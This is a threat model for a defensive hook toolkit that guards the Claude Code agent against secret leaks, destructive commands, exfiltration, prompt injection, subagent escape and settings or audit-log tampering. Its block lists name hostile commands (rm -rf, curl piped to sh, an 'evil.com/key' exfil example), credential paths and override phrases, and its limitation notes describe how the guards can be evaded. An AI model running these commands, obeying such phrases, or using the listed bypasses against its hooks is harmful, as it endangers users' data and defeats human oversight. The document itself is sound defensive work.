# Threat Model

> Status: Plans 1-5 covered. T-001 through T-017 documented; T-018 documented as known-deferred to Plan 9 (signed releases). Plan 5 added T-010 prompt injection, T-011 subagent escape, T-012 MDM bypass (passive per ADR-0003), and T-013 local settings precedence. Threat ID cleanup: the submodule supply-chain risk previously labelled T-005 (Plan 3) and T-013 (Plan 4) is now T-018 to align with the supply-chain numbering.

## Trust Boundaries

1. User prompt to Claude Code process
2. Claude Code to tool invocations (Bash, Edit, Write, WebFetch, MCP)
3. Tool to host filesystem / network / credentials
4. Subagent and parent agent
5. Local settings and managed settings

## Threat Register

### T-001: Secret Leak via Tool Output

- **Vector:** Bash, Read, MCP tools (input or output)
- **STRIDE:** Information Disclosure
- **Agentic Top 10:** A4 Sensitive Information Disclosure
- **Default mitigations:**
  - `secret-guard` (PreToolUse, block) detects secret literals in Bash command and env-dump patterns including bare `env` / `printenv`.
  - `secret-leak-detector` (PostToolUse, block) scans tool stdout/stderr/output for secret patterns. Truncates very large output to 256KB before scanning.
  - `keychain-guard` (PreToolUse, block) blocks macOS keychain CLI invocations that include value-printing flags. Existence checks pass through.
  - `mcp-secret-guard` (PreToolUse, block) scans MCP tool input payloads for secret literals.
- **Coverage:** baseline, strict, regulated profiles.
- **Known limitations:** custom secret formats not yet covered (extensible via `SECRET_PATTERNS`); base64-encoded or chunked secrets not detected.

### T-002: Destructive Filesystem Op

- **Vector:** Bash, Edit, Write
- **STRIDE:** Tampering
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `destructive-fs-guard` (PreToolUse, block) matches `rm -rf` of root or HOME, `mkfs`, `dd` writing to a device, `shred -u`.
  - `dotfile-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) flags Edit/Write to shell rc files, gitconfig, ssh config. Defends against persistence (PATH injection, alias hijack).
  - Plan 1 deny patterns from `overlays/destructive.json` provide an additional layer for the same patterns.
- **Coverage:** baseline (warn for dotfile), strict, regulated.
- **Known limitations:** does not detect symlink attacks or filesystem-level race conditions. Heredoc bodies not parsed.

### T-003: Credential File Exfil

- **Vector:** Read, Bash
- **STRIDE:** Information Disclosure
- **Agentic Top 10:** A4 Sensitive Information Disclosure
- **Default mitigations:**
  - `sensitive-paths-guard` (PreToolUse, block) hook-side check on Read and Bash for paths matching `/.ssh/`, `/.aws/`, `/.gnupg/`, `/.kube/`, `/.docker/`, `/.netrc`, GitHub CLI hosts file, `/etc/sudoers`, `/etc/shadow`.
  - Deny patterns in `overlays/secrets.json` and `overlays/sensitive-paths.json` enforce the same boundaries at the permission layer.
- **Coverage:** baseline, strict, regulated.
- **Known limitations:** symlink-following not detected. New credential dirs (e.g., future cloud providers) require updating `SENSITIVE_PATH_FRAGMENTS`.

### T-004: Force-Push / Branch Sabotage

- **Vector:** Bash (git CLI)
- **STRIDE:** Tampering
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `git-destructive-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) catches `git reset --hard`, `git clean -fd`, `git push --force`, `git push -f`, `git branch -D` on protected branches, `git rebase -i`.
  - `branch-protection-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) catches `git commit --no-verify`, `git commit --no-gpg-sign`, and direct push to protected branches (main/master/release/develop/prod/production) when `CCSEC_ALLOW_PROTECTED_PUSH` is unset.
  - `commit-amend-pushed-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) flags every `git commit --amend` invocation; user dismisses on baseline when amending unpushed work.
  - Deny patterns in `overlays/destructive.json` enforce the forced-push boundary at the permission layer.
- **Coverage:** baseline (warn), strict (block), regulated (block). Fully covered as of Plan 3.
- **Known limitations:** detection relies on argument string matching; obfuscated invocations (aliases, function wrappers, env-set flags) may bypass. The amend guard cannot reliably distinguish "already pushed" from "local-only" amends; it warns on every amend.

### T-005: Network Exfil via WebFetch and Bash

- **Vector:** WebFetch, Bash (curl, wget, fetch)
- **STRIDE:** Information Disclosure, Exfiltration
- **Agentic Top 10:** A4 Sensitive Information Disclosure, A6 Excessive Agency
- **Default mitigations:**
  - `webfetch-egress-guard` (PreToolUse, block all profiles) deny-by-default hostname allowlist for WebFetch. Blocks IP literals, DNS-over-HTTPS hosts, and any hostname not in the allowlist (`docs.anthropic.com`, `github.com`, `raw.githubusercontent.com`, `api.github.com`, `developer.mozilla.org`, `nodejs.org`, `registry.npmjs.org`, `pypi.org`).
  - `bash-egress-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) parses `curl`, `wget`, `fetch` invocations and applies the same allowlist plus an always-block list (`pastebin.com`, `transfer.sh`, `paste.ee`, `requestbin.com`). Also detects base64-encoded HTTP URLs (`aHR0c...`) as exfil obfuscation.
  - Deny patterns in `overlays/network-egress.json` enforce the same exfil-target list at the permission layer for both `WebFetch(*)` and `Bash(curl|wget *)`.
- **Coverage:** baseline (bash-egress=warn, webfetch-egress=block), strict (both block), regulated (both block). Fully covered as of Plan 4.
- **Known limitations:** does not inspect request bodies; a request to an allowlisted host can still exfil through a URL or POST body. New exfil-target hosts require updating the always-block list. Tor / onion routing not specifically addressed.

### T-006: Pipe-to-Shell Remote Execution

- **Vector:** Bash
- **STRIDE:** Elevation of Privilege
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `pipe-to-shell-guard` (PreToolUse, block) narrow regex match on `| sh`, `| bash`, `| zsh`, `| fish`, `| ksh`. Always blocks across profiles.
  - `bash-structural-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) detects `pipe_to_shell` as a structural risk kind. Redundant with pipe-to-shell-guard for this kind but provides defense-in-depth and detects unicode-lookalike pipe variants (U+FF5C).
  - Deny patterns in `overlays/bash-structural.json` enforce `Bash(curl * | sh|bash)`, `Bash(wget * | sh|bash)` at the permission layer.
- **Coverage:** baseline, strict, regulated.
- **Known limitations:** does not match heredoc-piped scripts or multi-stage piping that obscures the final shell invocation. Encoded payloads (base64-decoded then piped) are not detected.

### T-007: Command Chaining Bypass

- **Vector:** Bash
- **STRIDE:** Elevation of Privilege
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `bash-structural-guard` (PreToolUse) surfaces `chained_and`, `chained_or`, `chained_semicolon`, and `leading_cd` as structural risks for the audit trail but does NOT block them by default. These are everyday shell idioms; blocking would be too aggressive.
  - The risks are written to the audit log so reviewers can investigate post-hoc.
- **Coverage:** audit-only (all profiles).
- **Known limitations:** chaining can be used to launder a denied command into an allowed one (`safe_cmd && rm -rf $HOME`). The destructive part is caught by `destructive-fs-guard`, but more subtle laundering (e.g., chaining a benign curl with a write to a sensitive path) depends on downstream hooks catching the second component. Defense relies on the per-component matchers, not on blocking chaining itself.

### T-008: Git History Rewrite

- **Vector:** Bash (git CLI)
- **STRIDE:** Tampering
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `git-history-rewrite-guard` (PreToolUse, block) regex-matches `git filter-branch`, `git filter-repo`, `bfg --strip-blobs`, `git replace`, and `git update-ref HEAD|refs/heads/*`. Always blocks across profiles.
  - Deny patterns in `overlays/branch-guards.json` enforce `Bash(git filter-branch *)` and `Bash(git filter-repo *)` at the permission layer.
- **Coverage:** baseline, strict, regulated.
- **Known limitations:** does not detect lower-level plumbing commands that rewrite history without using these high-level tools (e.g., `git commit-tree` chains, manual ref manipulation through alternate refs). BFG variants beyond `--strip-blobs` are not all enumerated.

### T-009: Arbitrary Code via eval / Command Substitution

- **Vector:** Bash
- **STRIDE:** Elevation of Privilege
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `bash-structural-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) detects `command_substitution` (`$(...)` and backticks) and `process_substitution` (`<(...)` and `>(...)`) as structural risk kinds. Also flags unicode-lookalike dollar (U+FF04).
- **Coverage:** baseline (warn), strict (block), regulated (block).
- **Known limitations:** the parser does not evaluate substitutions; it only detects their syntactic presence. A benign `echo $(date)` is flagged the same as `echo $(curl evil.com/key)`. Users on baseline see warnings; users on strict/regulated need to refactor to direct invocations or whitelist via configuration.

### T-010: Prompt Injection from Tool Output

- **Vector:** Bash, WebFetch, Read (the response payload, not the input)
- **STRIDE:** Tampering, Information Disclosure
- **Agentic Top 10:** A1 Memory Poisoning / Prompt Injection
- **Default mitigations:**
  - `behavioral-rule-enforcer` (UserPromptSubmit, log all profiles) records every prompt that matches risky patterns ("ignore previous instructions", "system prompt", "you are now", "override instructions"). Forensic trail only; never blocks.
  - `untrusted-content-tagger` (PostToolUse on WebFetch and Read, log all profiles) scans response output for injection markers (`<system>`, `</system>`, `<![CDATA[`, "Ignore previous", "SYSTEM:") and records counts in the audit log so reviewers can re-evaluate the conversation.
  - `claude-md-validator` (SessionStart, severity warn on baseline / block on strict and regulated) parses the active CLAUDE.md (project then home) for risky directives ("disable hooks", "skip permission", "bypass security", "ignore audit") and refuses to start the session under strict and regulated when matches are present.
- **Coverage:** baseline (warn for CLAUDE.md, log for behavioral and untrusted-content), strict (block CLAUDE.md, log others), regulated (block CLAUDE.md, log others).
- **Known limitations:** behavioral-rule-enforcer is intentionally passive; promoting it to block would create a high false-positive surface. Untrusted-content markers are heuristic; well-crafted payloads that avoid the markers will pass through. Defense layered with downstream hooks (secret-leak-detector, sensitive-paths-guard) catching the action a poisoned prompt tries to take.

### T-011: Subagent Escape / Unauthorized Spawn

- **Vector:** Task tool (parent agent invoking subagent)
- **STRIDE:** Elevation of Privilege
- **Agentic Top 10:** A5 Cascading Reliability Failure / Excessive Agency
- **Default mitigations:**
  - `subagent-spawn-guard` (SubagentStart, severity warn on baseline / block on strict and regulated) checks `subagent_type` against `CCSEC_AGENT_ALLOWLIST` (comma-separated env). Unknown types warn or block per profile.
  - `task-tool-input-guard` (PreToolUse on Task, scalar block all profiles) scans the Task `prompt` and `description` for prompt-injection patterns (`ignore previous`, `bypass.*polic`, `override.*system`). Always blocks.
  - `agent-allowlist-enforcer` (SubagentStart, severity log baseline and strict / block regulated) emits a structured audit record per subagent spawn classifying it as allowlisted or not. Forensic trail; only blocks under regulated.
- **Coverage:** baseline (Task input always blocked; spawn warned; allowlist logged), strict (spawn blocked), regulated (spawn blocked, allowlist enforced).
- **Known limitations:** allowlist is env-driven; no signed manifest of trusted subagents. Empty `subagent_type` field passes through (cannot enforce on missing data). Task inputs that paraphrase injection patterns can evade the regex.

### T-012: MDM Bypass via disableAllHooks

- **Vector:** Settings (`~/.claude/settings.local.json`)
- **STRIDE:** Tampering
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `disable-all-hooks-detector` (SessionStart, scalar warn all profiles) reads `~/.claude/settings.local.json` (or `CCSEC_LOCAL_SETTINGS_PATH` override). When `disableAllHooks: true` is present, emits a warn-severity record so the operator and audit log capture the bypass attempt.
- **Coverage:** baseline, strict, regulated (passive across all profiles per ADR-0003).
- **Known limitations:** **PASSIVE BY DESIGN.** Per ADR-0003 we cannot block hooks from inside a hook (the same flag we are checking already disabled the runner that runs us when honored by Claude Code itself). This hook is forensic only: it documents the bypass attempt for an out-of-band reviewer. Block-on-bypass requires changes to Claude Code's hook loader, tracked upstream as issue #26637.

### T-013: Local Settings Overriding Managed

- **Vector:** Settings (`~/.claude/settings.local.json` shadowing managed `settings.json`)
- **STRIDE:** Tampering
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `local-settings-precedence-checker` (SessionStart, severity warn on baseline and strict / block on regulated) checks for the presence of `~/.claude/settings.local.json`. Existence alone is the signal: a regulated environment treats any local override as a precedence violation; baseline and strict warn so the operator can investigate.
- **Coverage:** baseline (warn), strict (warn), regulated (block).
- **Known limitations:** does not parse the file content; presence is the only signal. False positives are likely on dev machines that legitimately use `settings.local.json` for project-local config; regulated profiles should ship with managed settings only and treat the file as a tampering indicator.

### T-018: Supply Chain via Submodule (renamed from T-013)

- **Vector:** Edit, Write, Bash (git CLI)
- **STRIDE:** Tampering, Supply Chain
- **Agentic Top 10:** A3 Supply Chain Attacks
- **Default mitigations:**
  - `submodule-injection-guard` (PreToolUse, block) blocks Edit/Write to any `.gitmodules` file and Bash invocations of `git submodule add` or `git submodule update`.
  - Deny patterns in `overlays/branch-guards.json` enforce the boundary at the permission layer (Edit/Write on `*.gitmodules`).
- **Coverage:** baseline, strict, regulated.
- **Known limitations:** does not inspect submodule URLs for trust; trust is binary (block any add/update). Existing submodules already in the working tree are not blocked from being inspected. `git submodule status` and read-only operations pass through. **Distribution-side supply-chain integrity** (signed releases, SBOM, GHSA workflow) is tracked for Plan 9.

### T-014: Tool Spoofing via MCP

- **Vector:** MCP (rogue server registration, name collision with built-in tools)
- **STRIDE:** Spoofing
- **Agentic Top 10:** A8 Repudiation / Untraceability (proxy / impersonation surface)
- **Default mitigations:** PARTIAL.
  - `mcp-secret-guard` (PreToolUse, block) scans MCP tool input payloads for secret literals. Limits exfil through a spoofed tool but does not prevent the spoof itself.
  - Audit-log records every MCP invocation, so a compromised or impersonating MCP server leaves a forensic trail.
- **Coverage:** baseline, strict, regulated (partial coverage only).
- **Known limitations:** there is no provenance check on MCP server identity. A malicious local config that registers a server named identically to a trusted one would still be honored. Full mitigation (signature pinning or MCP allowlist) is deferred to a later plan.

### T-015: Audit Log Tampering

- **Vector:** Filesystem (direct edit, sed/echo append, file replacement)
- **STRIDE:** Tampering
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `audit-tamper-detector` (PostToolUse, severity warn on baseline / block on strict and regulated) runs `AuditLogger.verify()` on every PostToolUse event. Detects `prev-hash-mismatch`, `hash-mismatch`, and `invalid-json` corruption.
  - SHA-256 hash chain in `AuditLogger`: each record's `prev_hash` references the previous record's `hash`, so any insertion, deletion, or mutation of a prior record breaks the chain.
  - In-process write queue (Plan 4 hardening) prevents accidental chain breakage from concurrent writers in the same process.
  - `AuditLogger.verify()` returns `{ ok: true, records: 0 }` for missing files (defined empty-state semantics) and `{ ok: false, brokenAt: i, reason: 'invalid-json' }` for unparseable lines.
- **Coverage:** baseline (warn), strict (block), regulated (block).
- **Known limitations:** cross-process tampering (a separate process modifying the file while the runner is mid-write) can race; per-PID log files or `flock`-based locking is tracked for a future plan. An attacker with write access can also delete the entire log; the hook only flags chain breakage, not absence.

### T-016: Hook DoS / Runaway Timeout

- **Vector:** Hook implementation (slow regex, unbounded loop, network call inside hook)
- **STRIDE:** Denial of Service
- **Agentic Top 10:** A5 Cascading Reliability Failure
- **Default mitigations:**
  - The Plan 1 runner enforces a per-hook timeout via `AbortController` (default 1500ms; per-hook override via `manifest.timeout_ms`). A hook that exceeds its budget is aborted; the invocation is recorded with outcome `timeout` and the runner continues with the next hook.
  - Manifest schema validates `timeout_ms` and refuses to load hooks declaring excessive values.
- **Coverage:** baseline, strict, regulated (already mitigated as of Plan 1; documented here for completeness).
- **Known limitations:** a hook that hits its timeout still consumes the budget once; repeated invocations of a slow hook can accumulate latency. CPU-bound regex backtracking inside a hook is bounded by the timeout but can degrade UX on every event.

### T-017: Repudiation of Risky Action

- **Vector:** Any tool invocation that triggers a hook decision
- **STRIDE:** Repudiation
- **Agentic Top 10:** A6 Excessive Agency, A8 Repudiation / Untraceability
- **Default mitigations:**
  - Every hook invocation is appended to the audit log with `ts`, `hook`, `tool`, `decision`, `reason`, `duration_ms`, and SHA-256 hash chain.
  - `audit-session-summary` (SubagentStop, log all profiles) emits a single forensic summary record per subagent session containing aggregate counts (total events, blocks, warns, allows, timeouts, errors) and the hash of the last verified record.
  - `AuditLogger.verify()` provides on-demand integrity checks for after-the-fact audits.
- **Coverage:** baseline, strict, regulated.
- **Known limitations:** the audit log lives on the local filesystem; central log shipping is out of scope for Plan 4. Without external archival, an attacker with root access can delete the entire log in one operation.

## Explicit Non-Goals

- Not a sandbox.
- Not a runtime jail.
- Not a network firewall.
- Not a remote management system.
